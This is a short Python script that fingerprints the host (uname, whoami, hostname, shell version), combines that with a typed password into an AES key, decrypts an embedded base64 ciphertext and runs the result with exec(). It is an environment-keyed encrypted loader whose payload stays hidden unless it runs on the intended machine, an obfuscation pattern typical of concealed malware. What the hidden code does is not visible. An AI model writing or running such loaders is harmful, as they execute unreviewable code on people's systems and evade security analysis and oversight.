import subprocess
import sys
import base64
import hashlib
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import os


def get_id ():
    uname_out = subprocess.getoutput('uname')
    whoami_out = subprocess.getoutput('whoami')
    hostname_out = subprocess.getoutput('hostname')
    shell_type = subprocess.getoutput('echo $SHELL')
    shell_type_out = subprocess.getoutput(f'{shell_type} --version')

    identity = f'{whoami_out}-{hostname_out}-{uname_out}-{shell_type_out}'
    identity ="".join(identity.strip().replace(" ","").splitlines()).lower()
    return identity

def get_pass():
    return input("Password:")

def decrypt(ciphertext, key):
    # Extract the IV (first 16 bytes) and the actual ciphertext
    iv = ciphertext[:16]
    actual_ciphertext = ciphertext[16:]

    # Create a cipher object with the key and IV
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
    decryptor = cipher.decryptor()

    # Decrypt the ciphertext
    padded_text = decryptor.update(actual_ciphertext) + decryptor.finalize()

    # Remove the padding (last byte tells us how many padding bytes were added)
    padding_length = padded_text[-1]
    original_text = padded_text[:-padding_length]

    return original_text     

def key():
    key = base64.b64encode(f'{get_pass()}{get_id()}'.encode("utf-8"))
    sha256_hash = hashlib.sha256()
    sha256_hash.update(key)
    key = sha256_hash.digest()
    return key

exec(decrypt(base64.b64decode("{WnOzHThDUlBMqFE2VLiQTsNYB/DsBSidBRxff7RjHEBTRz6Lvs1fsEsVj3fnkuT4zltep1mLa4hB20YWmgt4UMPy3qwFIysiYnAPfDdB8/tGqCX7tvWFHH+IpUcXAsc44512/ab2PMmV3ZmHmj/UDGmLYkhRxv1Y6AzNMIMCMB2trWM5nhL7ir9S/q9rdpF25hvSwyWMPMaupe5gm1wE9u0vLkBgvp1MWwABi6t5s3A3YLMrTJAkbr7++k+rSN6CV8/71quPzDFiwUOZ+fLJc0cnPzNBJIyTOpSWpJm01ltQAwY9uJm3aDqa10PNZDJEA1/5LOahBaBPpP3mdJS8ew==}"), key()).decode())